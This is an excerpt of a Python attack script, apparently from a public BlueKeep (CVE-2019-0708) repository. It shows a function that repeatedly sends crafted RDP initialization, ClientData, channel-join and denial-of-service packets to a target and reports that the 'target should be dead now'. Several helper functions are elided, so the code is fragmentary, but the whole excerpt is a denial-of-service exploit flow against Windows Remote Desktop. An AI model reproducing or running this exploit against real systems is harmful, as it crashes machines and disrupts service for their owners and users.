# From https://github.com/ekultek/bluekeep
import time
import socket
import struct
import binascii
...
def cve_2019_0708(target):
    ...
    with redirect_stdout(f):
        try:
            print("[+] DoSing target: {} a total of {} times".format(target, dos_time))
            for i in range(dos_time):
                print("[+] DoS attempt: {}".format(i + 1))
                print("[+] establishing initialization")
                current_tls = send_initialization_pdu_packet(target, port, verbose=run_verbose)
                print("[+] sending ClientData PDU packets")
                send_client_data_pdu_packet(current_tls, verbose=run_verbose)
                print("[+] sending ChannelJoin ErectDomain and AttachUser PDU packets")
                send_channel_pdu_packets(current_tls, verbose=run_verbose)
                ...
                send_dos_packets(current_tls, arch)
                print("[+] target should be dead now, waiting {}s".format(wait_time))
